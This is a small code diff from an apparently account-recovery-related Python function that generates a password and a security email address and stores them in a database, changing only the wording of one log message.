@@ -379,7 +379,7 @@ async def romeo_recover(
             # Letters+digits, mixed case — no symbols
             password = make_ms_password(14)
             security_email = f"{sname}@{config['domain']}"
-            print(f"[+] - Generated Security Email ({security_email})")
+            print(f"[+] - [+] sec email ({security_email})")
 
             with DBConnection() as database:
                 database.add_security_email(security_email, password)
